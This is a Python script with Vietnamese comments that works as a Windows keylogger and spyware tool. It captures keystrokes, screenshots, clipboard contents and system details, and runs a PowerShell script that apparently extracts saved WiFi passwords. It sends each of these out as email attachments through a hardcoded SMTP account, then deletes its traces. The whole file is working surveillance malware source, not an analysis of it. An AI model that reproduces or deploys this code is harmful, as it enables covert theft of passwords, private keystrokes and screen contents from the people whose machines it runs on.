import importlib

required_libraries = [
    "smtplib",
    "sounddevice",
    "scipy",
    "pywin32",
    "pyscreenshot",
    "pynput",
    "pillow",
]


def install_library(library_name):
    try:
        importlib.import_module(library_name)
    except ImportError:
        import subprocess
        subprocess.check_call(["pip", "install", library_name])


def install_required_libraries():
    for library in required_libraries:
        install_library(library)


install_required_libraries()

# Import thư viện
import os
import pyscreenshot as ImageGrab
from pynput.keyboard import Key, Listener
import win32clipboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import time
import subprocess
import ctypes
import sys
import base64
import random
import shutil
from urllib3 import PoolManager


# Danh sách tên file
file_names = [
    "system.txt",
    "clipboard.txt",
    "screenshot.png",
    "key_log.txt",
    "wifi.txt",
]

file_path = os.path.dirname(os.path.abspath(__file__)) + "\\"

# Duyệt qua danh sách file
for file_name in file_names:
    # Kiểm tra file có tồn tại hay không
    if not os.path.exists(file_path + file_name):
        # Tạo file mới
        open(file_name, "w").close()

system_information = "system.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"
wifipass_information = "wifi.txt"


# Thời gian chạy
time_iteration = 60  # Thời gian lặp lại chương trình
number_of_iterations_end = 5  # Số lần lặp chương trình

# Mail chủ
email_address = "a4edf6b5769052"
password = "48e1cfcecbb4d0"


# Gửi mail
def send_email(filename, attachment):
    fromaddr = email_address
    toaddr = email_address

    # Gửi đa phương tiện
    msg = MIMEMultipart()

    # Địa chỉ ng gửi
    msg['From'] = fromaddr

    # Địa chỉ ng nhận
    msg['To'] = toaddr

    # Tiêu đề mail
    msg['Subject'] = "Log File"

    # Nội dung mail
    body = "Body_of_the_mail"

    # Đính kèm nội dung
    msg.attach(MIMEText(body, 'plain'))

    # Mở file để gửi
    filename = filename
    attachment = open(attachment, "rb")

    # Khởi tạo MINEBase
    p = MIMEBase('application', 'octet-stream')

    # Mã hoá nội dung
    p.set_payload(attachment.read())

    # encode thành base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # Đính kèm file khi gửi mail
    msg.attach(p)

    # Khởi tạo gửi mail
    s = smtplib.SMTP('sandbox.smtp.mailtrap.io', 2525)

    # Khởi tạo TLS để gửi mail
    s.starttls()

    # Xác thực
    s.login(fromaddr, password)

    # Chuyển đổi msg thành chuỗi
    text = msg.as_string()

    # Gửi
    s.sendmail(fromaddr, toaddr, text)
    s.quit()


# Lấy thông tin máy
def computer_information():
    with open(file_path + system_information, "a", encoding="utf-8") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)

        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Version: " + platform.version() + "\n")
        f.write("Release: " + platform.release() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("IP Address: " + IPAddr + "\n")


computer_information()
send_email(system_information, file_path + system_information)


# Dữ liệu từ clipboard
def copy_clipboard():
    try:
        with open(file_path + clipboard_information, "a", encoding="utf-8") as f:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
    except win32clipboard.error:
        # Xử lý ngoại lệ khi không thể truy cập clipboard
        with open(file_path + clipboard_information, "a") as f:
            f.write("Clipboard could not be accessed.")
    except Exception as e:
        # Xử lý ngoại lệ khác nếu có
        with open(file_path + clipboard_information, "a", encoding="utf-8") as f:
            f.write("An error occurred: " + str(e))


# Chụp màn hình
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + screenshot_information)


def wifipass():
    with open("wifi_script.txt", 'r') as file:
        command = file.read()
    with open(file_path + wifipass_information, 'a', encoding="utf-8") as file:
        subprocess.run(["powershell", "-Command", command], stdout=file)


 # Mật khẩu wifi
wifipass()
send_email(wifipass_information, file_path + wifipass_information)


# Kiểm soát trình tự
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []
    counter = 0

    # Sự kiện nhấn phím
    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    # Ghi file phím
    def write_file(keys):
        with open(file_path + keys_information, "a", encoding="utf-8") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return True
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        # Gửi nội dung ghi bàn phím
        send_email(keys_information, file_path + keys_information)
        # Xoá nội dung trong file ghi bàn phím
        with open(file_path + keys_information, "w") as f:
            f.write(" ")
        # Gửi ảnh chụp màn hình
        screenshot()
        send_email(screenshot_information, file_path + screenshot_information)
        # Gửi file nội dung clipboard
        copy_clipboard()
        send_email(clipboard_information, file_path + clipboard_information)
       
        # Tăng số lần lặp
        number_of_iterations += 1
        # Cập nhật lại thời gian
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

time.sleep(120)  # Tạm dừng

# Giải phóng file
for file in file_names:
    os.remove(file_path + file, encoding='utf-8')

